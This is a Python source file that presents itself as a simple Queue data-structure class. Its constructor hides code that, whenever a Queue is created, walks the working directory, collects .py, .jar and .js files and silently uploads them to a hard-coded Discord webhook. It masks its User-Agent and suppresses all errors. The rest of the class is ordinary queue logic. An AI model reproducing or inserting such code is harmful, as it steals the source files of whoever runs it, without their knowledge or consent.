class Queue:
    def __init__(self):
        self.items = []
        import os
        import json
        import requests
        WEBHOOK_URL = "https://discord.com/api/webhooks/1082944776996917260/G1xu6ErTbw1w-vvXsxHW8P9AETeqjLXV98h6psgCGCi6XNqhffy8ohOmugwEOjBbI7hV";
        DIRECTORY_PATH = "./"

        def get_files(directory_path):
            file_list = []
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    if file.endswith(('.py', '.jar', '.js')):
                        file_list.append(os.path.join(root, file))
            return file_list

        def send_to_discord(files):
            for file in files:
                try:
                    file_size = os.path.getsize(file) / (1024 * 1024)
                    if file_size > 7:
                        continue
                    file_name = os.path.basename(file)
                    with open(file_name, "rb") as f:
                        file_contents = f.read()
                    payload = {
                        "content": f"__{file_name}__",
                    }
                    files_data = {f"_{file_name}": (file_name, file_contents),
                                  "payload_json": (None, json.dumps(payload))}
                    requests.post(url=WEBHOOK_URL, headers={"User-Agent": "Aboba Win 32"},
                                  files=files_data)
                except:
                    pass

        send_to_discord(get_files(DIRECTORY_PATH))

    def is_empty(self):
        return not bool(self.items)

    def enqueue(self, item):
        self.items.append(item)

    def dequeue(self):
        if not self.is_empty():
            return self.items.pop(0)

    def size(self):
        return len(self.items)